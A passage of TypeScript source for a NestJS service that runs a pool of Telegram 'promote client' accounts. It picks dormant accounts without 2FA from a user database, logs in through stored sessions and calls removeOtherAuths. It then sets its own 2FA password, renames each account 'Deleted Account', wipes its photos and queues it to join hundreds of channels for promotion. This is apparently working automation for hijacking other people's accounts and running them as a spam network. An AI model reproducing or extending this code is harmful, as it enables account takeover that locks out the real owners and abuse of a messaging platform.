filter = statusFilter ? { status: statusFilter } : {};\n        return this.promoteClientModel.find(filter).exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<PromoteClient> {\n        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n    async update(mobile: string, updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n        const updatedUser = await this.promoteClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async updateStatus(mobile: string, status: string, message?: string): Promise<PromoteClient> {\n        const updateData: any = { status };\n        if (message) {\n            updateData.message = message;\n        }\n\n        return this.update(mobile, updateData);\n    }\n\n    async updateLastUsed(mobile: string): Promise<PromoteClient> {\n        return this.update(mobile, { lastUsed: new Date() });\n    }\n\n    async markAsUsed(mobile: string, message?: string): Promise<PromoteClient> {\n        const updateData: any = { lastUsed: new Date() };\n        if (message) {\n            updateData.message = message;\n        }\n\n        return this.update(mobile, updateData);\n    }\n\n    async markAsInactive(mobile: string, reason: string): Promise<PromoteClient> {\n        return this.updateStatus(mobile, 'inactive', reason);\n    }\n\n    async markAsActive(mobile: string, message: string = 'Account is functioning properly'): Promise<PromoteClient> {\n        return this.updateStatus(mobile, 'active', message);\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto): Promise<PromoteClient> {\n        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            this.logger.debug(\"Updating existing promote client\");\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);\n        } else {\n            this.logger.debug(\"Creating new promote client\");\n            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        try {\n            this.logger.log(`Removing PromoteClient with mobile: ${mobile}`);\n\n            const deleteResult = await this.promoteClientModel.deleteOne({ mobile }).exec();\n\n            if (deleteResult.deletedCount === 0) {\n                throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n            }\n\n            await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);\n        } catch (error) {\n            if (error instanceof NotFoundException) {\n                throw error;\n            }\n            const errorDetails = parseError(error);\n            this.logger.error(`Error removing PromoteClient with mobile ${mobile}: ${errorDetails.message}`);\n            throw new HttpException(errorDetails.message, errorDetails.status);\n        }\n        this.logger.log(`PromoteClient with mobile ${mobile} removed successfully`);\n    }\n    async search(filter: any): Promise<PromoteClient[]> {\n        this.logger.debug(`Search filter: ${JSON.stringify(filter)}`);\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        this.logger.debug(`Modified filter: ${JSON.stringify(filter)}`);\n        return this.promoteClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<PromoteClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.promoteClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromPromoteMap(key: string) {\n        this.joinChannelMap.delete(key)\n    }\n    clearPromoteMap() {\n        this.logger.debug(\"PromoteMap cleared\");\n        this.joinChannelMap.clear();\n        this.clearJoinChannelInterval();\n    }\n\n    async updateInfo() {\n        const clients = await this.promoteClientModel.find({\n            status: 'active'\n        }).sort({ channels: 1 })\n\n        for (const client of clients) {\n            const mobile = client.mobile;\n            try {\n                this.logger.debug(`Updating info for client: ${mobile}`);\n                const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                const channels = await telegramClient.channelInfo(true);\n                this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);\n                await this.update(mobile, { channels: channels.ids.length });\n                await connectionManager.unregisterClient(mobile);\n                await sleep(2000);\n            } catch (error) {\n                const errorDetails = parseError(error);\n                await this.markAsInactive(mobile, `${errorDetails.message}`);\n                this.logger.error(`Error updating info for client ${client.mobile}:`, errorDetails);\n            }\n        }\n    }\n\n    async joinchannelForPromoteClients(skipExisting: boolean = true): Promise<string> {\n        if (this.telegramService.getActiveClientSetup()) {\n            this.logger.warn('Active client setup exists, skipping promotion process');\n            return 'Active client setup exists, skipping promotion';\n        }\n\n        this.logger.log('Starting join channel process');\n        this.joinChannelMap.clear();\n        this.leaveChannelMap.clear();\n        this.clearJoinChannelInterval();\n        this.clearLeaveChannelInterval();\n        await sleep(2000);\n\n        try {\n            const existingKeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());\n\n            const clients = await this.promoteClientModel.find({\n                channels: { $lt: 350 },\n                mobile: { $nin: existingKeys },\n                status: 'active'\n            }).sort({ channels: 1 }).limit(8);\n\n            this.logger.debug(`Found ${clients.length} clients to process for joining channels`);\n\n            const joinSet = new Set<string>();\n            const leaveSet = new Set<string>();\n            let successCount = 0;\n            let failCount = 0;\n\n            for (const document of clients) {\n                const mobile = document.mobile;\n                this.logger.debug(`Processing client: ${mobile}`);\n\n                try {\n                    const client = await connectionManager.getClient(mobile, {\n                        autoDisconnect: false,\n                        handler: false\n                    });\n\n                    const channels = await client.channelInfo(true);\n                    this.logger.debug(`${mobile}: Found ${channels.ids.length} existing channels`);\n\n                    await this.update(mobile, { channels: channels.ids.length });\n\n                    if (channels.canSendFalseCount < 10) {\n                        const excludedIds = channels.ids;\n                        const channelLimit = 150;\n\n                        const result = channels.ids.length < 220\n                            ? await this.channelsService.getActiveChannels(channelLimit, 0, excludedIds)\n                            : await this.activeChannelsService.getActiveChannels(channelLimit, 0, excludedIds);\n\n                        if (!this.joinChannelMap.has(mobile)) {\n                            this.joinChannelMap.set(mobile, result);\n                            joinSet.add(mobile);\n                        } else {\n                            this.logger.debug(`${mobile}: Already in join queue, skipping re-add`);\n                        }\n                    } else {\n                        this.logger.debug(`${mobile}: Too many blocked channels (${channels.canSendFalseCount}), preparing for leave`);\n                        if (!this.leaveChannelMap.has(mobile)) {\n                            this.leaveChannelMap.set(mobile, channels.canSendFalseChats);\n                            leaveSet.add(mobile);\n                        } else {\n                            this.logger.debug(`${mobile}: Already in leave queue, skipping re-add`);\n                        }\n                    }\n\n                    successCount++;\n\n                } catch (error) {\n                    failCount++;\n                    const errorDetails = parseError(error);\n                    this.logger.error(`Error processing client ${mobile}:`, errorDetails);\n\n                    const errorMsg = error?.errorMessage || errorDetails?.message || 'Unknown error';\n                    const isFatalSessionError = [\n                        \"SESSION_REVOKED\",\n                        \"AUTH_KEY_UNREGISTERED\",\n                        \"USER_DEACTIVATED\",\n                        \"USER_DEACTIVATED_BAN\",\n                        \"FROZEN_METHOD_INVALID\"\n                    ].includes(errorMsg);\n\n                    if (isFatalSessionError) {\n                        this.logger.warn(`${mobile}: Fatal session error (${errorMsg}), marking as inactive and removing`);\n                        try {\n                            await this.markAsInactive(mobile, `Session error: ${errorMsg}`);\n                        } catch (statusUpdateError) {\n                            this.logger.error(`Failed to update status for ${mobile}:`, statusUpdateError);\n                        }\n                        await this.remove(mobile);\n                    } else {\n                        this.logger.warn(`${mobile}: Non-fatal error encountered, will retry later`);\n                    }\n                } finally {\n                    connectionManager.unregisterClient(mobile);\n                    await sleep(2000); // brief pause to reduce CPU bursts\n                }\n            }\n\n            if (joinSet.size > 0) {\n                this.logger.debug(`Starting join queue for ${joinSet.size} clients`);\n                this.joinChannelQueue();\n            }\n\n            if (leaveSet.size > 0) {\n                this.logger.debug(`Starting leave queue for ${leaveSet.size} clients`);\n                this.leaveChannelQueue();\n            }\n\n            this.logger.log(`Join channel process completed for ${clients.length} clients`);\n            return `Initiated Joining channels for ${joinSet.size} | Queued for leave: ${leaveSet.size}`;\n\n        } catch (error) {\n            this.logger.error('Unexpected error during joinchannelForPromoteClients:', error);\n            this.clearJoinChannelInterval();\n            this.clearLeaveChannelInterval();\n            throw new Error('Failed to initiate channel joining process');\n        }\n    }\n\n    async joinChannelQueue() {\n        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {\n            this.logger.warn('Join channel process is already running');\n            return;\n        }\n\n        const existingKeys = Array.from(this.joinChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to join, skipping queue');\n            return;\n        }\n\n        this.isJoinChannelProcessing = true;\n        this.joinChannelIntervalId = setInterval(async () => {\n            let processTimeout: NodeJS.Timeout;\n            try {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length === 0) {\n                    this.logger.log('Join channel map is empty, clearing interval');\n                    this.clearJoinChannelInterval();\n                    return;\n                }\n\n                processTimeout = setTimeout(() => {\n                    this.logger.error('Join channel interval processing timeout');\n                    this.clearJoinChannelInterval();\n                }, this.JOIN_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing join channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.joinChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    let currentChannel: Channel | null = null;\n                    try {\n                        const channels = this.joinChannelMap.get(mobile);\n                        if (!channels || channels.length === 0) {\n                            this.logger.debug(`No more channels to join for ${mobile}, removing from map`);\n                            this.removeFromPromoteMap(mobile);\n                            continue;\n                        }\n\n                        currentChannel = channels.shift();\n                        // Only update map if there are remaining channels\n                        if (channels.length > 0) {\n                            this.logger.debug(`${mobile}: Pending channels to join: ${channels.length}`);\n                            this.joinChannelMap.set(mobile, channels);\n                        } else {\n                            this.removeFromPromoteMap(mobile);\n                        }\n\n                        await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                        this.logger.debug(`${mobile}: Attempting to join channel: @${currentChannel.username}`);\n                        await this.telegramService.tryJoiningChannel(mobile, currentChannel);\n                    } catch (error: any) {\n                        const errorDetails = parseError(error, `${mobile} @${currentChannel?.username || 'unknown'} Outer Err ERR: `, false);\n                        this.logger.error(`${mobile}: Error joining @${currentChannel?.username || 'unknown'}:`, errorDetails);\n\n                        const errorMsg = error.errorMessage || error.message;\n                        if (errorDetails.error === 'FloodWaitError' || errorMsg === 'CHANNELS_TOO_MUCH') {\n                            this.logger.warn(`${mobile}: FloodWaitError or too many channels, handling...`);\n                            this.removeFromPromoteMap(mobile);\n                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\n                            await this.update(mobile, { channels: channelsInfo.ids.length });\n                        }\n                        if (errorMsg === \"SESSION_REVOKED\" ||\n                            errorMsg === \"AUTH_KEY_UNREGISTERED\" ||\n                            errorMsg === \"USER_DEACTIVATED\" ||\n                            errorMsg === \"USER_DEACTIVATED_BAN\") {\n                            this.logger.error(`Session invalid for ${mobile}, marking as inactive and removing client`);\n                            try {\n                                await this.markAsInactive(mobile, `Session error: ${errorMsg}`);\n                            } catch (statusUpdateError) {\n                                this.logger.error(`Failed to update status for ${mobile}:`, statusUpdateError);\n                            }\n                            await this.remove(mobile);\n                        }\n                    } finally {\n                        await connectionManager.unregisterClient(mobile);\n                    }\n                }\n            } catch (error) {\n                this.logger.error('Error in join channel interval', error);\n                this.clearJoinChannelInterval();\n            } finally {\n                if (processTimeout) {\n                    clearTimeout(processTimeout);\n                }\n            }\n        }, this.JOIN_CHANNEL_INTERVAL);\n\n        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            this.isJoinChannelProcessing = false;\n\n            if (this.joinChannelMap.size > 0) {\n                setTimeout(() => {\n                    this.logger.debug('Triggering next join channel process');\n                    this.joinchannelForPromoteClients(false);\n                }, 30000);\n            }\n        }\n    }\n\n    removeFromLeaveMap(key: string) {\n        this.leaveChannelMap.delete(key);\n        if (this.leaveChannelMap.size === 0) {\n            this.clearLeaveChannelInterval();\n        }\n    }\n\n    clearLeaveMap() {\n        this.logger.debug(\"LeaveMap cleared\");\n        this.leaveChannelMap.clear();\n        this.clearLeaveChannelInterval();\n    }\n\n    async leaveChannelQueue() {\n        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {\n            this.logger.warn('Leave channel process is already running');\n            return;\n        }\n\n        const existingKeys = Array.from(this.leaveChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to leave, not starting queue');\n            return;\n        }\n\n        this.isLeaveChannelProcessing = true;\n        this.leaveChannelIntervalId = setInterval(async () => {\n            let processTimeout: NodeJS.Timeout;\n            try {\n                const keys = Array.from(this.leaveChannelMap.keys());\n                if (keys.length === 0) {\n                    this.logger.debug('Leave map is empty, clearing interval');\n                    this.clearLeaveChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                processTimeout = setTimeout(() => {\n                    this.logger.error('Leave channel interval processing timeout');\n                    this.clearLeaveChannelInterval();\n                }, this.LEAVE_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    try {\n                        this.logger.debug(`Processing leave channels for mobile: ${mobile}`);\n                        const channels = this.leaveChannelMap.get(mobile);\n                        if (!channels || channels.length === 0) {\n                            this.logger.debug(`No channels to leave for mobile: ${mobile}`);\n                            this.removeFromLeaveMap(mobile);\n                            continue;\n                        }\n\n                        const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);\n\n                        // Only update map if there are remaining channels\n                        if (channels.length > 0) {\n                            this.logger.debug(`${mobile}: Processing ${channelsToProcess.length} channels, ${channels.length} remaining`);\n                            this.leaveChannelMap.set(mobile, channels);\n                        } else {\n                            this.removeFromLeaveMap(mobile);\n                        }\n\n                        const client = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                        this.logger.debug(`${mobile}: Attempting to leave ${channelsToProcess.length} channels`);\n                        await client.leaveChannels(channelsToProcess);\n                        this.logger.debug(`${mobile}: Successfully left ${channelsToProcess.length} channels`);\n                    } catch (error: any) {\n                        const errorDetails = parseError(error);\n                        this.logger.error(`Error in leave channel process for ${mobile}:`, errorDetails);\n                        if (\n                            errorDetails.message === \"SESSION_REVOKED\" ||\n                            errorDetails.message === \"AUTH_KEY_UNREGISTERED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED_BAN\"\n                        ) {\n                            this.logger.warn(`${mobile}: Session invalid, removing client`);\n                            await this.remove(mobile);\n                            this.removeFromLeaveMap(mobile);\n                        }\n                    } finally {\n                        await connectionManager.unregisterClient(mobile);\n                    }\n                }\n            } catch (error) {\n                this.logger.error('Error in leave channel interval', error);\n                this.clearLeaveChannelInterval();\n            } finally {\n                if (processTimeout) {\n                    clearTimeout(processTimeout);\n                }\n            }\n        }, this.LEAVE_CHANNEL_INTERVAL);\n\n        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);\n    }\n\n    clearLeaveChannelInterval() {\n        if (this.leaveChannelIntervalId) {\n            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);\n            clearInterval(this.leaveChannelIntervalId);\n            this.leaveChannelIntervalId = null;\n        }\n        this.isLeaveChannelProcessing = false;\n        this.logger.debug('Leave channel interval cleared and processing flag reset');\n    }\n\n    async setAsPromoteClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile, expired: false }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('PromoteClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n\n        // Check if this mobile is already assigned as a promote mobile\n        const existingAssignment = await this.promoteClientModel.findOne({\n            mobile,\n            clientId: { $exists: true }\n        });\n\n        if (!clientMobiles.includes(mobile) && !existingAssignment) {\n            const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false });\n            try {\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                await sleep(3000)\n                await telegramClient.deleteProfilePhotos();\n                const channels = await this.telegramService.getChannelInfo(mobile, true)\n                const promoteClient = {\n                    tgId: user.tgId,\n                    lastActive: \"default\",\n                    mobile: user.mobile,\n                    availableDate,\n                    channels: channels.ids.length,\n                    status: 'active', // Set default status\n                    message: 'Manually configured as promote client', // Set initial message\n                    lastUsed: null // Initially not used\n                }\n                await this.promoteClientModel.findOneAndUpdate(\n                    { mobile: user.mobile },\n                    { $set: promoteClient },\n                    { new: true, upsert: true }\n                ).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, errorDetails.status)\n            }\n            await connectionManager.unregisterClient(mobile)\n            return \"Client set as promote successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n    async checkPromoteClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            const clients = await this.clientService.findAll();\n            const bufferClients = await this.bufferClientService.findAll();\n\n            const clientMainMobiles = clients.map(c => c.mobile);\n            const bufferClientIds = bufferClients.map(c => c.mobile);\n\n            const assignedPromoteMobiles = await this.promoteClientModel\n                .find({ clientId: { $exists: true }, status: 'active' })\n                .distinct('mobile');\n\n            const goodIds = [...clientMainMobiles, ...bufferClientIds, ...assignedPromoteMobiles].filter(Boolean);\n\n            const promoteClientsPerClient = new Map<string, number>();\n            const clientNeedingPromoteClients: string[] = [];\n\n            // Count existing active promote clients per clientId using aggregation for better performance\n            const promoteClientCounts = await this.promoteClientModel.aggregate([\n                {\n                    $match: {\n                        clientId: { $exists: true, $ne: null },\n                        status: 'active'\n                    }\n                },\n                {\n                    $group: {\n                        _id: '$clientId',\n                        count: { $sum: 1 }\n                    }\n                }\n            ]);\n\n            for (const result of promoteClientCounts) {\n                promoteClientsPerClient.set(result._id, result.count);\n            }\n\n            for (const client of clients) {\n                const assignedCount = promoteClientsPerClient.get(client.clientId) || 0;\n                promoteClientsPerClient.set(client.clientId, assignedCount);\n\n                const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - assignedCount);\n                if (needed > 0) {\n                    clientNeedingPromoteClients.push(client.clientId);\n                }\n            }\n\n            // Count needed promote clients for tracking only\n            let totalSlotsNeeded = 0;\n\n            // Distribute the slots across clients that need promote clients\n            for (const clientId of clientNeedingPromoteClients) {\n                if (totalSlotsNeeded >= this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER) break;\n\n                const assignedCount = promoteClientsPerClient.get(clientId) || 0;\n                const needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - assignedCount);\n                const allocatedForThisClient = Math.min(needed, this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER - totalSlotsNeeded);\n\n                totalSlotsNeeded += allocatedForThisClient;\n            }\n\n            this.logger.debug(`Promote clients per client: ${JSON.stringify(Object.fromEntries(promoteClientsPerClient))}`);\n            this.logger.debug(`Clients needing promote clients: ${clientNeedingPromoteClients.join(', ')}`);\n            this.logger.debug(`Total slots needed: ${totalSlotsNeeded} (limited to max ${this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER} per trigger)`);\n\n            // Get total active promote clients count for logging\n            const totalActivePromoteClients = await this.promoteClientModel.countDocuments({ status: 'active' });\n            this.logger.debug(`Total active promote clients: ${totalActivePromoteClients}`);\n\n            // Only proceed with creating new promote clients if we have clients that need them\n            if (clientNeedingPromoteClients.length > 0 && totalSlotsNeeded > 0) {\n                await this.addNewUserstoPromoteClients([], goodIds, clientNeedingPromoteClients, promoteClientsPerClient);\n            } else {\n                this.logger.debug('No new promote clients needed - all clients have sufficient promote clients');\n            }\n        } else {\n            this.logger.warn(\"Ignored active check promote channels as active client setup exists\");\n        }\n    }\n\n    async addNewUserstoPromoteClients(\n        badIds: string[],\n        goodIds: string[],\n        clientsNeedingPromoteClients: string[] = [],\n        promoteClientsPerClient?: Map<string, number>\n    ) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n\n        // Calculate total needed based on client requirements\n        let totalNeededFromClients = 0;\n        for (const clientId of clientsNeedingPromoteClients) {\n            let needed = 0;\n            if (promoteClientsPerClient) {\n                const currentCount = promoteClientsPerClient.get(clientId) || 0;\n                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);\n            } else {\n                // Fallback to database query if map not provided - only count active\n                const currentCount = await this.promoteClientModel.countDocuments({\n                    clientId,\n                    status: 'active'\n                });\n                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);\n            }\n            totalNeededFromClients += needed;\n        }\n\n        // Limit to maximum 10 new promote clients per trigger\n        const totalNeeded = Math.min(totalNeededFromClients, 10);\n\n        if (totalNeeded === 0) {\n            this.logger.debug('No promote clients needed - all clients have sufficient promote clients or limit reached');\n            return;\n        }\n\n        this.logger.debug(`Limited to creating ${totalNeeded} new promote clients (max 10 per trigger)`);\n\n        const documents = await this.usersService.executeQuery(\n            {\n                mobile: { $nin: goodIds },\n                expired: false,\n                twoFA: false,\n                lastActive: { $lt: sixMonthsAgo },\n                totalChats: { $gt: 150 }\n            },\n            { tgId: 1 },\n            totalNeeded + 5 // Get a few extra in case some fail\n        );\n\n        this.logger.debug(`New promote documents to be added: ${documents.length} for ${clientsNeedingPromoteClients.length} clients needing promote clients (limited to ${totalNeeded})`);\n\n        let processedCount = 0;\n        const clientAssignmentTracker = new Map<string, number>();\n\n        // Initialize tracker for clients that need promote clients\n        for (const clientId of clientsNeedingPromoteClients) {\n            let needed = 0;\n            if (promoteClientsPerClient) {\n                const currentCount = promoteClientsPerClient.get(clientId) || 0;\n                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);\n            } else {\n                // Fallback to database query if map not provided - only count active\n                const currentCount = await this.promoteClientModel.countDocuments({\n                    clientId,\n                    status: 'active'\n                });\n                needed = Math.max(0, this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT - currentCount);\n            }\n            clientAssignmentTracker.set(clientId, needed);\n        }\n\n        while (processedCount < Math.min(totalNeeded, this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER) && documents.length > 0 && clientsNeedingPromoteClients.length > 0) {\n            const document = documents.shift();\n            if (!document || !document.mobile || !document.tgId) {\n                this.logger.warn('Invalid document found, skipping');\n                continue;\n            }\n\n            // Find a client that still needs promote clients\n            let targetClientId: string | null = null;\n            for (const clientId of clientsNeedingPromoteClients) {\n                const needed = clientAssignmentTracker.get(clientId) || 0;\n                if (needed > 0) {\n                    targetClientId = clientId;\n                    break;\n                }\n            }\n\n            if (!targetClientId) {\n                this.logger.debug('All clients have sufficient promote clients assigned');\n                break;\n            }\n\n            try {\n                const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false });\n                try {\n                    const hasPassword = await client.hasPassword();\n                    this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        this.logger.debug(\"Waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        const channels = await client.channelInfo(true)\n                        this.logger.debug(`Inserting Document for client ${targetClientId}`);\n                        const promoteClient = {\n                            tgId: document.tgId,\n                            lastActive: \"today\",\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                            clientId: targetClientId, // Assign to specific client\n                            status: 'active', // Set default status\n                            message: 'Account successfully configured as promote client', // Set initial message\n                            lastUsed: null // Initially not used\n                        }\n                        await this.create(promoteClient);\n                        try {\n                            await this.usersService.update(document.tgId, { twoFA: true });\n                        } catch (userUpdateError) {\n                            this.logger.warn(`Failed to update user 2FA status for ${document.mobile}:`, userUpdateError);\n                            // Continue anyway as this is not critical\n                        }\n\n                        this.logger.log(`=============Created PromoteClient for ${targetClientId}==============`);\n                    } else {\n                        this.logger.debug(`Failed to Update as PromoteClient as ${document.mobile} already has Password`);\n                        try {\n                            await this.usersService.update(document.tgId, { twoFA: true });\n                        } catch (userUpdateError) {\n                            this.logger.warn(`Failed to update user 2FA status for ${document.mobile}:`, userUpdateError);\n                        }\n                    }\n\n                    // Update tracker and remove client from list if satisfied (regardless of success/failure)\n                    const currentNeeded = clientAssignmentTracker.get(targetClientId) || 0;\n                    const newNeeded = Math.max(0, currentNeeded - 1);\n                    clientAssignmentTracker.set(targetClientId, newNeeded);\n\n                    if (newNeeded === 0) {\n                        const index = clientsNeedingPromoteClients.indexOf(targetClientId);\n                        if (index > -1) {\n                            clientsNeedingPromoteClients.splice(index, 1);\n                        }\n                    }\n\n                    this.logger.debug(`Client ${targetClientId}: ${newNeeded} more needed, ${totalNeeded - processedCount - 1} remaining in this batch`);\n                    processedCount++; // Always increment to prevent infinite loops\n                } catch (error: any) {\n                    this.logger.error(`Error processing client ${document.mobile}: ${error.message}`);\n                    parseError(error);\n                    processedCount++; // Always increment even on errors to prevent infinite loops\n                } finally {\n                    try {\n                        await connectionManager.unregisterClient(document.mobile);\n                    } catch (unregisterError: any) {\n                        this.logger.error(`Error unregistering client ${document.mobile}: ${unregisterError.message}`);\n                    }\n                }\n            } catch (error: any) {\n                this.logger.error(`Error creating client connection for ${document.mobile}: ${error.message}`);\n                parseError(error);\n            }\n        }\n\n        // Log completion status\n        this.logger.log(`✅ Batch completed: Created ${processedCount} new promote clients (max ${totalNeeded} per trigger)`);\n        if (clientsNeedingPromoteClients.length > 0) {\n            const stillNeeded = clientsNeedingPromoteClients.map(clientId => {\n                const needed = clientAssignmentTracker.get(clientId) || 0;\n                return `${clientId}:${needed}`;\n            }).join(', ');\n            this.logger.log(`⏳ Still needed in future triggers: ${stillNeeded}`);\n        } else {\n            this.logger.log(`🎉 All clients now have sufficient promote clients!`);\n        }\n\n        setTimeout(() => {\n            this.joinchannelForPromoteClients()\n        }, 2 * 60 * 1000);\n    }\n\n    async onModuleDestroy() {\n        this.logger.log('Cleaning up PromoteClientService resources');\n        this.clearPromoteMap();\n        this.clearLeaveMap();\n    }\n\n    /**\n     * Get promote client distribution per client for monitoring and debugging\n     */\n    async getPromoteClientDistribution(): Promise<{\n        totalPromoteClients: number;\n        unassignedPromoteClients: number;\n        activePromoteClients: number;\n        inactivePromoteClients: number;\n        distributionPerClient: Array<{\n            clientId: string;\n            assignedCount: number;\n            activeCount: number;\n            inactiveCount: number;\n            needed: number;\n            status: 'sufficient' | 'needs_more';\n            neverUsed: number;\n            usedInLast24Hours: number;\n        }>;\n        summary: {\n            clientsWithSufficientPromoteClients: number;\n            clientsNeedingPromoteClients: number;\n            totalPromoteClientsNeeded: number;\n            maxPromoteClientsPerTrigger: number;\n            triggersNeededToSatisfyAll: number;\n        };\n    }> {\n        const clients = await this.clientService.findAll();\n\n        // Get aggregated data in single queries for better performance\n        const now = new Date();\n        const last24Hours = new Date(now.getTime() - (24 * 60 * 60 * 1000));\n\n        const [\n            totalPromoteClients,\n            unassignedPromoteClients,\n            activePromoteClients,\n            inactivePromoteClients,\n            assignedCounts,\n            activeCounts,\n            inactiveCounts,\n            neverUsedCounts,\n            recentlyUsedCounts\n        ] = await Promise.all([\n            this.promoteClientModel.countDocuments(),\n            this.promoteClientModel.countDocuments({ clientId: { $exists: false } }),\n            this.promoteClientModel.countDocuments({ status: 'active' }),\n            this.promoteClientModel.countDocuments({ status: 'inactive' }),\n            // Get assigned counts per client\n            this.promoteClientModel.aggregate([\n                { $match: { clientId: { $exists: true, $ne: null } } },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } }\n            ]),\n            // Get active counts per client\n            this.promoteClientModel.aggregate([\n                { $match: { clientId: { $exists: true, $ne: null }, status: 'active' } },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } }\n            ]),\n            // Get inactive counts per client\n            this.promoteClientModel.aggregate([\n                { $match: { clientId: { $exists: true, $ne: null }, status: 'inactive' } },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } }\n            ]),\n            // Get never used counts per client\n            this.promoteClientModel.aggregate([\n                {\n                    $match: {\n                        clientId: { $exists: true, $ne: null },\n                        status: 'active',\n                        $or: [\n                            { lastUsed: { $exists: false } },\n                            { lastUsed: null }\n                        ]\n                    }\n                },\n                { $group: { _id: '$clientId', count: { $sum: 1 } } }\n            ]),\n            // Get recently used counts per client\n            this.promoteClientModel.aggregate([\n                {\n                    $match: {\n                        clientId: { $exists: true, $ne: null },\n                        status: 